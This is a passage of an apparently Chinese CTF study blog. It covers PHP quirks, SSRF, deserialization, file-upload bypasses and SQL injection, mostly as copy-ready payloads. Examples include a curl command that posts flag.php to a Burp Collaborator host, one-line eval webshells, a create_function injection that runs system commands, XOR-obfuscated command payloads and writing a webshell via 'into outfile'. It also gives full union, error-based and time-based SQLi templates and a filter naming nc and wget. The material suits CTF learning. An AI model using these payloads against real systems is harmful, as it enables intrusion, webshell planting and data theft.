c&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F; self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;se lf&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php\n18.num!&#x3D;&#x3D;36 and num&#x3D;&#x3D;36 和 trim绕过web115先来看官方文档中对于这两个比较运算符的解释\n\n\n\n$a &#x3D;&#x3D; $b\n等于\n**true**，如果类型转换后 $a 等于 $b。\n\n\n\n$a !&#x3D;&#x3D; $b\n不全等\n**true**，如果 $a 不等于 $b，或者它们的类型不同。\n\n\n当两个操作对象都是  数字字符串，  或一个是数字另一个是  数字字符串，  就会自动按照数值进行比较。  此规则也适用于  switch 语句。  当比较时用的是 === 或 !==，  则不会进行类型转换——因为不仅要对比数值，还要对比类型。 \nvar_dump(intval($num));\n$num&#x3D;%0c36时强制转换后值为36\n为什么要传**%0c**\n%0c在ascii表中代表换页符\n\n\n并且trim中去除的字符不包含%0c 可以绕过\n通过文档已知**&#x3D;&#x3D;在做比较时会对字符串进行转换成数值后再进行比较** 这里的转换过程类似 intval()\n%0c36在这个转换过程中也会转换成数值36\n所以\nnum&#x3D;%0c36 num&#x3D;&#x3D;36 为真\n!&#x3D;&#x3D;属于强比较类型\n会比较数值的同时比较类型\n%0c36明显是个字符串类型  36是整形\n所以\nnum&#x3D;%0c36 num！&#x3D;&#x3D;36 为真\n两个判断同时绕过\n19.php get或post变量名中非法字符转化规则get或者post传入的变量名含有  空格、+、.、[  则会被转化为\neg:\ndiao_s.i &#x3D;&#x3D;》diao_s_i\n也就是PHP网页用diao_s_i可以正常接收diao_s.i传递过来的值，中间会有个自动转换的过程\n如果传入**[，它被转化为_之后**，后面的字符就会被保留下来不会被替换。\neg:\ndiao[s.i &#x3D;&#x3D;&gt; diao_s.i，利上面的[经过一次转换后可以正常接收\nweb123\n如果让if判断为真，就必须传入CTF_SHOW.COM\n我们已知  .  是非法变量名，但要保留  .   就需要把  _  换成  [  即可\n思路一\npayload:\nCTF_SHOW&#x3D;1&amp;CTF[SHOW.COM&#x3D;2&amp;fun&#x3D;echo $flag\n思路二\n利用php内置函数\n\n\n12345&lt;?php$array = [&#x27;lastname&#x27;, &#x27;email&#x27;, &#x27;phone&#x27;];var_dump(implode(&quot;,&quot;, $array));// string(20) &quot;lastname,email,phone&quot;\n\n\n\n\n\n拿文件名\n\n拿已定义变量值\n\n可以多去了解get开头的php内置函数\n20.var_export和include$_GET[1]和highlight_file($GET[1])web125$_GET[1]的用法\n$_GET[1]：这会从 URL 查询参数中获取名为 1 的值，如果该字符串是有效的文件路径，然后在某种上下文中被执行，比如通过 include 或 file_get_contents 等函数，那么它会将该文件的内容作为字符串返回。\nPS:file_get_contents无法使用原因\n\n21.parse_str()及$_SERVER[argv]的利用web126\n12345678&lt;?php$str = &quot;first=value&amp;arr[]=foo+bar&amp;arr[]=baz&quot;;// 推荐用法parse_str($str, $output);echo $output[&#x27;first&#x27;];  // valueecho $output[&#x27;arr&#x27;][0]; // foo barecho $output[&#x27;arr&#x27;][1]; // baz\n\n‘argv‘\n​              传递给该脚本的参数的数组。当脚本以命令行方式运行时，argv 变量传递给程序 C 语言样式的命令行参数。当通过 GET 方式调用时，该变量包含query string\n命令行模式下：$_SERVER[&#39;argv&#39;][0]是脚本名，其他的是传递给脚本的参数。 网页模式下：需要php.ini开启register_argc_argv配置\n\n$_SERVER[&#39;argv&#39;][0] = $_SERVER[&#39;QUERY_STRING&#39;];$_SERVER[‘argv’][0] 是$_SERVER[‘QUERY_STRING’];，$_SERVER[‘argv’][1] 的传递方式就和命令行类似了，空格，然后传递第二个参数，以此类推。利用$_SERVER[‘argv’][1] 就可以绕过对isset($fl0g)的判断。用+代表空格\n最终payload\n\n下图可以看到\n$_SERVER[argv][0]等同于$_SERVER[QUARY_STRING]\n通过本地实验可得 url直接输入字符就是$_SERVER[&#39;argv&#39;][0] 是输入的字符串，所以可以利用来执行php语句。\n\n最终payload \n\n22.extract构造新变量web127\n当看见\nextract($_GET)时\n即可直接构造并引入新变量\n1234if($ctf_show===&#x27;ilove36d&#x27;)&#123;echo $flag;&#125;\n\n就直接可以传入\nGET:url?ctf_show&#x3D;ilove36d\n即使先前已存在$ctf_show也会覆盖掉\n最终payload：\nGET:url?ctf show&#x3D;ilove36d  下划线用空格或+替代即可\n23._()  别名gettext() 函数\n对f1进行无字母数字过滤\n所以var_dump var_export都用不了\n可以想到gettext() 可以将参数翻译成指定语言，一般就是原封不动的输出参数\n别名_()可以传入\n最终payload:\n?f1&#x3D;_&amp;f2&#x3D;get_defined_vars    call_user_func传入参数时仅需传入参数名称即可\n24.stripos函数绕过web130查找字符串在另一字符串中第一次出现的位置（不区分大小写）\n返回布尔值，未找到返回0（false）,找到返回1（true）\n采用数组绕过的方法，stripos函数会返回null,null!=false,所以可以绕过stripos函数\n25.substr截取绕过&amp;数据外带123456789if($F = @$_GET[&#x27;F&#x27;])&#123;    if(!preg_match(&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;, $F))    &#123;        eval(substr($F,0,6));    &#125;else    &#123;        die(&quot;6个字母都还不够呀?!&quot;);    &#125;&#125;\n\nGET传入\n1.传入的是$F本身\n2.返回的是6个字符 有一个空格\n3.所以返回后eval中本质是eval()\n4.因为$F &#x3D; @$_GET[&#39;F&#39;]，$_GET[&#39;F&#39;]内容为\n5.即eval() \n6.发现执行后网页加载三秒，即可构造命令执行\n7.发现touch 1；命令无效，转为数据外带\n利用burp的Collaborator Client 类似dnslog 但更强大\npayload：\n\ncurl -X POST -F xx&#x3D;@flag.php\n-X POST 指定了请求的方法为 POST\n-F xx=@flag.php 则表示向请求中添加一个名为 xx 的表单字段，并将文件 flag.php 的内容作为该字段的值\n这个命令的作用是将 flag.php 文件的内容作为一个表单字段发送到指定的目标地址\n目标地址即是burp的Collaborator Client中获取到域名\n获取后执行会得到回显\n即数据外带成功\n\n26.$_SERVER[QUARY_STRING]和parse_str的妙用12345&lt;?php highlight_file(__FILE__);$F = @$_POST[&#x27;F&#x27;];$b=&#x27;aaaaaaa&#x27;;eval($F);@parse_str($_SERVER[&#x27;QUERY_STRING&#x27;]);\n\n\n查看发现GET传参中a已被parse_str函数解析成变量\n\nweb134\n我们就可以在GET传\n?_POST[key1]=36d&amp;_POST[key2]=36d\n1.绕过第一个if\n2.将_POST[key1]解析成$_POST[]\n3.符合第二个if判断\n27.ls &gt; 112 和 ls |tee 114命令执行回显输入到文件\n1.2.\nweb136第一种方法被ban掉\npayload:\nGET:  ?c&#x3D;cat &#x2F;f149_15_h3r3 | tee 1\n访问url&#x2F;1之后会下载文件，文件内容即是回显\n\n28.通过call_user_func()调用类中方法web1371234567891011&lt;?phpclass ctfshow&#123;    function __wakeup()&#123;        die(&quot;private class&quot;);    &#125;    static function getFlag()&#123;        echo file_get_contents(&quot;flag.php&quot;);    &#125;&#125;call_user_func($_POST[&#x27;ctfshow&#x27;]); \n\npayload:\n1.POST:ctfshow&#x3D;ctfshow::getFlag  等同于  call_user_func(ctfshow .’::getFlag’);\n2.POST:**ctfshow[]&#x3D;ctfshow&amp;ctfshow[]&#x3D;getFlag **等同于 call_user_func(array(ctfshow, ‘getFlag’));\n29.弱类型比较web140在PHP中，当进行弱类型比较时，如果一个字符串被转换成整数时，会根据其内容进行转换。如果字符串不能被转换为合法的整数，那么它会被转换为0。\neg:    if(intval($code) == &#39;ctfshow&#39;)\n前者返回值为0即可通过判断\n12345678f1=sleep&amp;f2=sleepf1=md5&amp;f2=phpinfof1=md5&amp;f2=md5f1=sha1&amp;f2=getcwdf1=intval&amp;f2=getcwdf1=getcwd&amp;f2=getcwdf1=exec&amp;f2=execf1=system&amp;f2=system\n\n总之思路就是找到一个函数, 使它的返回值为空, 空值 intval 之后也会变成0\n30.数字可以和命令进行一些运算eg:\n&lt;?phpecho 1-(&#39;phpinfo&#39;)()-1; \nweb141加减运算\n1preg_match(&#x27;/^\\W+$/&#x27;, $str)\n\n\n^：匹配输入字符串的开头\n\\W：匹配任何非单词字符（[^a-zA-Z0-9_]）\n+：匹配前面的模式一次或多次\n$：匹配输入字符串的结尾\n\n\npayload:v1&#x3D;1&amp;v2&#x3D;1&amp;v3&#x3D;-(“%08%02%08%08%05%0d”^”%7b%7b%7b%7c%60%60”)(“%03%01%08%00%06%0c%01%07%00%0b%08%0b”^”%60%60%7c%20%60%60%60%60%2e%7b%60%7b”);\nweb145三目运算   a|b|c\npayload:\nv1&#x3D;1&amp;v3&#x3D;|(%8C%86%8C%8B%9A%92)(%9C%9E%8B%DF%99%D5)|&amp;v2&#x3D;1\nv1&#x3D;1&amp;v3&#x3D;?(%8C%86%8C%8B%9A%92)(%9C%9E%8B%DF%99%D5):&amp;v2&#x3D;1\n31.php命名空间  &amp;  create_function函数注入命名空间使用PHP 命名空间中的类名可以通过三种方式引用：\n\n非限定名称，或不包含前缀的类名称，例如 $a&#x3D;new foo(); 或  foo::staticmethod();。如果当前命名空间是 currentnamespace，foo 将被解析为  currentnamespace\\foo。如果使用 foo 的代码是全局的，不包含在任何命名空间中的代码，则 foo 会被解析为foo。  警告：如果命名空间中的函数或常量未定义，则该非限定的函数名称或常量名称会被解析为全局函数名称或常量名称。\n\n限定名称,或包含前缀的名称，例如 $a &#x3D; new  subnamespace\\foo(); 或 subnamespace\\foo::staticmethod();。如果当前的命名空间是  currentnamespace，则 foo 会被解析为 currentnamespace\\subnamespace\\foo。如果使用 foo  的代码是全局的，不包含在任何命名空间中的代码，foo 会被解析为subnamespace\\foo。\n\n完全限定名称，或包含了全局前缀操作符的名称，例如， $a &#x3D; new  \\currentnamespace\\foo(); 或  \\currentnamespace\\foo::staticmethod();。在这种情况下，foo 总是被解析为代码中的文字名(literal  name)currentnamespace\\foo。\n\n\n我们常使用的是第三个 完全限定名称\n​\t联系上文，如果我们要调用php中的函数，就可以\n​\t\\create_function （输入函数名即可）\n​\t这样写发是因为 \\ 后的变量是调用  \\  这个命名空间下的\n​\t同理，调用\\这个命名空间下的函数，即\\create_function\ncreate_function函数注入create_function  匿名函数动态创建函数\neg:\n12345&lt;?php$id = $_GET[&#x27;id&#x27;];$q = &#x27;echo&#x27;.$id.&#x27;is&#x27;.$a.&quot;;&quot;;$sy = create_function(&#x27;$a&#x27;,$q);?&gt;\n\n这段代码等价于\n123function niming($a)&#123;       echo $id.&#x27;is&#x27;.$a;&#125;\n\n前者中的q就相当于函数体\n我们第二段代码本地实验发现可以闭合函数体，进行命令执行 （create_function函数是调用了eval）\n1234http://localhost/create_function.php?id=1;&#125;phpinfo();/*;&#125; 闭合原来函数体/*  闭合后会多出来一个 / ，需将其注释掉\n\n\n发现php探针成功\n用第一段代码进行本地实验发现也可执行\nweb147payload:\nPOST: ctf&#x3D;\\create_function\nGET: ?show&#x3D;1;}system(‘cat flag.php’);&#x2F;*\n","slug":"php特性","date":"2024-10-25T06:19:58.000Z","categories_index":"","tags_index":"ctf","author_index":"Sygsdsg"},{"id":"41141451a0f1e1bb096d2164075e94d3","title":"SSRF","content":"SSRF\n\nSSRF信息收集ssrf信息收集File伪协议 扫描内网主机查看内网地址 file:&#x2F;&#x2F;&#x2F;etc&#x2F;host\n寻找内网其他主机 file:&#x2F;&#x2F;&#x2F;proc&#x2F;net&#x2F;arpArp协议可无视防火墙 只要在工作即可扫出来\n配合BP扫描该网段\n\nssrf信息收集Ditc伪协议 扫描内网主机端口运用BP集束炸弹模式扫描网段和端口​    操作同理\n\nDitc伪协议 扫描速度快端口扫描常用端口\n\nssrf信息收集HTTP伪协议 扫描子域配合BP导入字典扫描\n\nSSRF Gopher伪协议​    \nGET传参poc​    \n进行url编码\n[gopher:&#x2F;&#x2F;172.250.250.4:80&#x2F;**_**GET%20&#x2F;name.php%3fname&#x3D;benben%20HTTP&#x2F;1.1%0d%0AHost:%20172.250.250.4%0d%0A](gopher:&#x2F;&#x2F;172.250.250.4:80&#x2F;_GET &#x2F;name.php%3fname&#x3D;benben HTTP&#x2F;1.1 Host: 172.250.250.4 )  \nGET提交最后一定要增加一个换行符 %0d%0a\n​    、\n也可以传一个 gopher:&#x2F;&#x2F;172.250.250.4:80&#x2F;_ 再将poc粘贴在后边（记得要2次URL编码可搭配BP或Hackbar）演示方法如下\nPOST传参poc\nContent-length 要和提交长度相对应 如上 name&#x3D;jianjian 有十三个字符 leangth为13 \n将poc放入拦截网站下划线后\n\n选中的部分进行两次URL编码\n\n编码后如图\n\n放行即可\n\n\nSSRF之回环地址绕过\n​    可见 127.0.0.1被禁止\n可以将点分十进制转换成十进制​    2130706433 即可绕过\n​    \n​    其他进制同理\n​    \nSSRF之302重定向绕过\n先搭建一个公网服务 （用php搭建）\n代码如下\n\n实现一个302重定向到127.0.0.1的功能\n开启网站服务\n\n再将监听的ip映射到公网服务器上\n访问公网ip之后即可重定向并返回到对方服务器下的flag.php的内容\n\nSSRF之DNS重绑定绕过​    DNS重绑定网站 http://lock.cmpxchg8b.com/rebinder.html\n​     \n​    \nSSRF之命令执行​    可以直接传cmd命令\n​    \n​    也可以搭配gopher协议使用 来传POST参数\nSSRF之XXE漏洞利用​    通过快照可知为post传参\n \n​    通过源代码可知content-type为xml 从而可以利用xxe漏洞\n​    \n​    Poc构造如下\n​    \n​    最后再利用gopher伪协议来提交POST参数\nSSRF之SQL注入GET注意两点即可\n​    1\n​    \n2\n\nPOST注入仍是利用gophar构造poc\n\nSSRF之文件上传​    利用gophar构造poc （注意content-type变化）\n \nPs:boundary&#x3D;xxxxx xxxxx可自定义 在上边poc中 –xxxxx为分割符 –xxxxx–为结束符\n​    上传完成之后访问文件目录即可\n\nSSRF写入操作​    【0x016 使用SSRF对mysql进行未授权查询】https://www.bilibili.com/video/BV1qQ4y1u7S4?vd_source&#x3D;dbbe851caa5969ed57ce1b7f9b095e7c\n​    16-21\n​    \n常见的绕过方式总结1、限制为http://www.xxx.com 域名时（利用@）txt可以尝试采用http基本身份认证的方式绕过\n如：http://www.aaa.com@www.bbb.com@www.ccc.com，在对@解析域名中，不同的处理函数存在处理差异\n在PHP的parse_url中会识别www.ccc.com，而libcurl则识别为www.bbb.com。2.采用短网址绕过txt比如百度短地址https://dwz.cn/3.采用进制转换txt127.0.0.1八进制：0177.0.0.1。十六进制：0x7f.0.0.1。十进制：2130706433.在这里插入图片描述\n4.利用特殊域名txt原理是DNS解析。xip.io可以指向任意域名，即\n127.0.0.1.xip.io，可解析为127.0.0.1\n(xip.io 现在好像用不了了，可以找找其他的)5.利用[::]txt可以利用[::]来绕过localhost\nhttp://169.254.169.254&gt;&gt;http://[::169.254.169.254]6.利用句号txt127。0。0。1 &gt;&gt;&gt; 127.0.0.17、CRLF 编码绕过txt%0d-&gt;0x0d-&gt;\\r回车\n%0a-&gt;0x0a-&gt;\\n换行\n进行HTTP头部注入example.com&#x2F;?url&#x3D;http://eval.com%0d%0aHOST:fuzz.com%0d%0a \ntxt18.利用封闭的字母数字txt利用Enclosed alphanumerics\nⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ &gt;&gt;&gt; example.com\nhttp://169.254.169.254&gt;&gt;&gt;http://[::①⑥⑨｡②⑤④｡⑯⑨｡②⑤④]\nList:\n① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳\n⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇\n⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛\n⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵\nⒶ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ\nⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ\n⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴\n⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿","slug":"SSRF","date":"2024-10-24T06:13:31.000Z","categories_index":"","tags_index":"ctf","author_index":"Sygsdsg"},{"id":"aead1356d56fb4acb210e498b4d44c7a","title":"Unserialize","content":"Unserialize前置知识\n  \n   序列化后语句为\n1a:3:&#123;s:4:&quot;name&quot;;s:8:&quot;John Doe&quot;;s:3:&quot;age&quot;;i:25;s:6:&quot;grades&quot;;a:3:&#123;i:0;i:85;i:1;i:90;i:2;i:78;&#125;&#125;\n\n\na:3: 表示这是一个关联数组类型（即 Array）。\n{} 表示数组元素的开始和结束。\ns:4:”name”;     表示键名为 “name” 的字符串类型元素，长度为 4。\ns:8:”John     Doe”; 表示键名为 “name” 的字符串类型值，长度为 8。\ns:3:”age”;     表示键名为 “age” 的字符串类型元素，长度为 3。\ni:25; 表示键名为 “age” 的整数类型值。\ns:6:”grades”;     表示键名为 “grades” 的字符串类型元素，长度为 6。\na:3:{} 表示一个索引数组类型（即 Array），包含三个元素。\ni:0;i:85; 表示第一个元素的键名为 0，值为 85。\ni:1;i:90; 表示第二个元素的键名为 1，值为 90。\ni:2;i:78; 表示第三个元素的键名为 2，值为 78。\n\n魔术变量__construct()构造函数实例化对象时触发__destruct()析构函数对象销毁时unserialize后触发\n基础漏洞实例\n__sleep序列化之前触发\n\nsleep与 serialize捆绑，所以url传参时直接传命令本体\n__wakeup反序列化之前触发用法与sleep相似\nWakeup与unserialize捆绑\n所以url传参时直接传命令的序列化形式\nEg:\n\n摘出wakeup中相关的参数,写php运行出相应的payload序列化式命令 \n\n\n进行url传参获取目标\n\nWakeup绕过当序列化字符串中表示对象属性个数的值大于真实的属性个数时\n会跳过__wakeup的执行\n 可见题解 https://www.nssctf.cn/note/set/2934\n__toString()把对象当做字符串调用时触发相关函数 strtolower()\nEg:\n1234567891011121314151617&lt;?phphighlight_file(__FILE__);error_reporting(0);class User &#123;    var $benben = &quot;this is test!!&quot;;        public function __toString() &#123;        return &#x27;格式不对，输出不了!&#x27;;    &#125;&#125;$test = new User();print_r($test);echo &quot;&lt;br /&gt;&quot;;echo $test;?&gt;\n\n12User Object ( [benben] =&gt; this is test!! ) 格式不对，输出不了!\n\n \n标记的两句均把对象当做字符串调用\n__invoke()把对象当函数调用时触发触发相关代码\nreturn $bb();\n示例\n123456789101112131415161718&lt;?phphighlight_file(__FILE__);error_reporting(0);class User &#123;    var $benben = &quot;this is test!!&quot;;    public function __invoke() &#123;        echo &#x27;它不是个函数!&#x27;;        return $this; // return $this to allow chaining    &#125;&#125;$test = new User();echo $test-&gt;benben;echo &quot;&lt;br /&gt;&quot;;echo $test()-&gt;benben; // This will now work correctly?&gt;\n\n执行结果\n12this is test!!它不是个函数!\n\n__call()调用不存在的方法或函数时触发触发相关代码\n $this-&gt;start-&gt;helloworld();\n1234567891011&lt;?phpclass User &#123;    public function __call($arg1, $arg2) &#123;        echo &quot;$arg1,$arg2[0]&quot;;    &#125;&#125;$test = new User();$test-&gt;callxxx(&#x27;a&#x27;);?&gt;  //执行结果 callxxx,a\n\n\n\n\n\n__callStatic() (静态）调用不存在的成员方法触发静态调用：**$test::callxxx(‘a’)**\n\n\n__get()调用不存在的成员属性时触发访问其他类中私有属性\n__set()给不存在的成员属性赋值时触发\n__isset()和__unset()调用protrcted &#x2F;private &#x2F; 不存在的成员属性时触发__clone()当使用clone关键字拷贝完一个对象时触发字符串逃逸减少\n前后引号不计入长度 \n“system()”字符串长度为8\n三个为24；就会多吃掉24个字符串\n将xx对应v2成员属性长度和构造v3总字符串长度之和\n\n12str__replace(“system()”,” ”,$data);//将$data中的system（）替换成空字符\n\n\n\n\n构造时注意闭合\n\n用var_dump(unserialize())来判断是否成功逃逸 成功逃逸标志 看obj个数\n\n字符串逃逸减少例题讲解视频https://www.bilibili.com/video/BV1R24y1r71C?p=18&amp;vd_source=dbbe851caa5969ed57ce1b7f9b095e7c\n例题网站：http://192.168.38.128:8002/class17/1.php\n**字符串逃逸减少 **\n构造用到成员属性多**(需要2个)**\n构造时不要漏掉成员属性\n增多https://www.bilibili.com/video/BV1R24y1r71C?p=17&amp;vd_source=dbbe851caa5969ed57ce1b7f9b095e7c\n例题网站：http://192.168.38.128:8002/class16/1.php\n**字符串逃逸 增多 构造用到成员属性少（1个）增多题目 **\n用var_dump来检验\n\n在此题中仅构造user即可，无需管pass(因为pass目标值已构造在user中)，\n吐出字符数量要和  相匹配（从   ”;   开始计数到   ;}   停止)\n引用\n在此题中若要保证enter和sercret一致\n可以让secret引用enter的值\n\n**&amp;**引用符号\nphar文件利用\n\n利用条件\nPhp.ini中的phar.readonly要开启\nPhar文件构造\n变更第三行的class和第十一行实例化的对象,生成文件内容如下\n\n生成txt.phar之后改后缀.Jpg .png .gif 上传\nPost传参 获取flag\n\n例题 https://www.nssctf.cn/problem/3018\n​    https://www.nssctf.cn/problem/466\n","slug":"Unserialize","date":"2024-10-23T13:07:30.000Z","categories_index":"ctf入门","tags_index":"ctf","author_index":"Sygsdsg"},{"id":"8b370a147ba28b5f9bf92d0ab1030d7d","title":"LFI","content":"文件上传判断漏洞形式\n一句话木马\n后缀 空格和点搭配 反复试 eg a.php. .\n后缀 %00和0x00截断 %00需要PHP版本小于5.3.4\n%00截断如图\n\n覆盖配置.htaccess文件\nuser.ini\n前者内容如图\n\n大小写绕过a.php::$DATA伪造GIF89agetimagesize()若图片马 无法直接利用\n\n伪造文件头(在PHP文件文件中伪造) GIF89a \n\n将木马写到合法文件里\n1copy /b test.png+1.php muma.png\n\n直接使用工具增加备注写入一句话木马\n\n\n重命名重命名为xxx.php:.jpg \n然后再上传xxx.&lt;&lt;&lt;\nMIME伪造改Content-Type\n常见Content-Type后缀\n\n二次渲染准备多个图片马 每个木马位置要不同 多次尝试多次上传 要多留坚强的图片马\n时间竞争\nburp抓包 发送攻击器 攻击\n不断上传生成木马文件的文件\n\n此文件如下\n\n\n不断访问前者\n\n改后缀名 .phtml .phps .pht .phtml .php3 .php5 …… \nPHP标签修改木马内容\n123456789GIF89a&lt;script language=&#x27;php&#x27;&gt;@eval($_POST[&quot;a&quot;]);show_source(&quot;/flag&quot;); (可有可没有)&lt;/script&gt;\n\n复写1.jpg改为1.jpg.php \n再用蚁剑连接，连接时名称为：1.jpg.php\n双写1.php改为1.phphpp\n","slug":"LFI","date":"2024-10-23T13:05:28.000Z","categories_index":"ctf入门","tags_index":"ctf","author_index":"Sygsdsg"},{"id":"6c4585b45b97f020140cf6fd5e44ee5e","title":"upload","content":"文件上传判断漏洞形式\n一句话木马\n后缀 空格和点搭配 反复试 eg a.php. .\n后缀 %00和0x00截断 %00需要PHP版本小于5.3.4\n%00截断如图\n\n覆盖配置.htaccess文件\nuser.ini\n前者内容如图\n\n大小写绕过a.php::$DATA伪造GIF89agetimagesize()若图片马 无法直接利用\n\n伪造文件头(在PHP文件文件中伪造) GIF89a \n\n将木马写到合法文件里\n1copy /b test.png+1.php muma.png\n\n直接使用工具增加备注写入一句话木马\n\n\n重命名重命名为xxx.php:.jpg \n然后再上传xxx.&lt;&lt;&lt;\nMIME伪造改Content-Type\n常见Content-Type后缀\n\n二次渲染准备多个图片马 每个木马位置要不同 多次尝试多次上传 要多留坚强的图片马\n时间竞争\nburp抓包 发送攻击器 攻击\n不断上传生成木马文件的文件\n\n此文件如下\n\n\n不断访问前者\n\n改后缀名 .phtml .phps .pht .phtml .php3 .php5 …… \nPHP标签修改木马内容\n123456789GIF89a&lt;script language=&#x27;php&#x27;&gt;@eval($_POST[&quot;a&quot;]);show_source(&quot;/flag&quot;); (可有可没有)&lt;/script&gt;\n\n复写1.jpg改为1.jpg.php \n再用蚁剑连接，连接时名称为：1.jpg.php\n双写1.php改为1.phphpp\n","slug":"upload","date":"2024-10-23T05:58:00.000Z","categories_index":"ctf入门","tags_index":"ctf","author_index":"Sygsdsg"},{"id":"d55a4990aee4e4791fcfc2d40ba4ba3b","title":"sql","content":"SQL Injection宽字节绕过addslashes() 功能 在‘和“前加\\来实体化 \nGET（需要是GBK编码）在’或”前加%df eg: %df’%df” 解决实体化问题 ps:有时要将‘换成**%27**  “同理；\n\n  当查询到字段时，库名用database()代替，需将’users‘换成0x7573657273 (7573657273是users字符转换成16进制仅转换表名，不要加上’或”) ps:不要忘掉0x 字符转16进制网站：https://www.sojson.com/hexadecimal.html  \nPOST 因为%df是url编码，无法用到POST传参\n\n所以需要用burp抓包，然后在Hex中将’前的16进制数改为df；\n与gbk编码为三字节的汉语组合，eg:汉（GBK三字节文字）  ß’ or 1&#x3D;1–+ &#x3D;&gt;汉‘ or 1&#x3D;1 –  ß就是%df在post传参的体现\n\n&#x3D;的平替空格的平替： like  &#x2F;*&#x2F;, %20, %0a(换行),%a0,(),+;** \n参数污染 eg sqli_labs-29 url参数get传参为?id&#x3D;1 ,参数污染即再传一个相同的参数 eg:id&#x3D;1&amp;id&#x3D;1’ union select… 闭合在第二个参数后\n注释 –，–+，–%20,–qwe,#,and ‘1’&#x3D;’1,%23(注意闭合方式与参数闭合保持一致)\n堆叠注入 极其危险 若有mysqli_multi_query函数 即可堆叠注入\n 须先闭合参数 \n1insert into users(id,username,password) value (&#x27;100&#x27;,&#x27;100&#x27;,&#x27;100&#x27;) --qwe\n\n可以根据堆叠注入来修改密码\n\n拿表 \n1show tables;\n\n拿字段\n1show columns from `xxx ` \n\n\n\n\nps:用反引号来包裹名字\n\n二次注入less-24 注册时用户名为 admin&#39;# \n密码为111111\n这样一来用户admin的密码便改为111111\n联合查询语句模板库名1?id=1&#x27; union select 1,2,database() --+\n\n表名1?id=1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+\n\n字段名1?id=1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; --+\n\n字段内容1?id=1&#x27; union select 1,group_concat(username),group_concat(password) from users --+\n\n报错注入语句模板库名1?id=1&#x27;extractvalue(1,concat(&#x27;~&#x27;,(select database()))) --+\n\n表名1?id=1&#x27;extractvalue(1,concat(&#x27;~&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) --+\n\n字段名1?id=1&#x27;extractvalue(1,concat(&#x27;~&#x27;,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;))) --+\n\n字段内容1?id=1&#x27;extractvalue(1,concat(&#x27;~&#x27;,(select group_concat(username),group_concat(password) from users))) --+\n\n时间盲注语句模板库名长度1?id=1&#x27; and（length(database()))=8 and sleep(1) --+\n\n 如果页面响应时间为1秒，则数据库长度为8\n​      \n库名1?id=1&#x27; and (ascii(substr(database(),1,1)))=115 and sleep(1) --+\n\n 如果页面响应时间为1秒，则数据库第一位字母为s (s的ascii值是115)\n表名长度1?id=1&#x27; and (length((select table_name from information_schema.tables where table_schema=database() limit 0,1)))&gt;=8 and sleep(1) --+ \n\n​      \n表名1?id=1&#x27; and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))=115 and sleep(1) --+\n\n 如果页面响应时间为1秒，则数据库第一个表的第一个字母为e\n字段名长度1?id=1&#x27; and (length((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1)))=10 and sleep(1) --+\n\n 如果页面响应时间为1秒，则数据库users表第一个字段的长度为10\n字段名1?id=1&#x27; and (ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),1,1)))=115 and sleep(1) --+\n\n 如果页面响应时间为1秒，则数据库users表第一个字段的第一个字母为e\n字段内容长度1?id=1&#x27; and (length((select password from users limit 0,1)))=4 and sleep(1) --+ \n\n如果页面响应时间为1秒，则数据库users表第一个字段的第一个内容长度为4\n字段内容1?id=1&#x27; and (ascii(substr((select password from users limit 0,1),1,1)))=115 and sleep(1) --+\n\n 如果页面响应时间为1秒，则数据库users表第一个字段的第一个内容的字为e\nif语句if(1,2,3)\n1?id=1&#x27;and if(length(database()&gt;1,sleep(2),1)\n\n 如果页面响应时间为2秒，则数据库长度大于1\n\n10:sql写马语句（前提：mysql开启了secure_file_priv&#x3D;””的配置，可以堆叠注入）eg: ?id&#x3D;1’;select’‘into outfile ‘c:&#x2F;&#x2F;www&#x2F;&#x2F;1.php’\nsql文件操作语句读文件1234567select load_file(&#x27;c:/boot.ini&#x27;) #可以用16进制代替字符串select load_file(0x633a2f626f6f742e696e69)select load_file(&#x27;//ecma.io/1.txt&#x27;) # smb协议select load_file(&#x27;\\\\\\\\ecma.io\\\\1.txt&#x27;) # 可用于DNS隧道\n\n写文件12select 0x313233 into outfile 